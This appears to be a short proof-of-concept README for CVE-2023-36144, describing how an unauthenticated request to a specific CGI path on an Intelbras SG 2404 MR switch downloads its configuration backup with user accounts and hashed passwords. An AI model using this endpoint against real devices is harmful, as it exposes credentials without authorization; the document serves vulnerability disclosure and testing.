# CVE-2023-36144

PoC of CVE-2023-36144 - Intelbras Switch SG 2404 MR L2+ firmware 1.00.54

## Download the backup file unauthenticated


## Steps to Reproduce:

1. Go to the following link http://127.0.0.1/cgi-bin/exportCfgwithpasswd (replace 127.0.0.1 with the device IP)
2. It will auto download the backup file, containing the device configurations and its users and hashed passwords
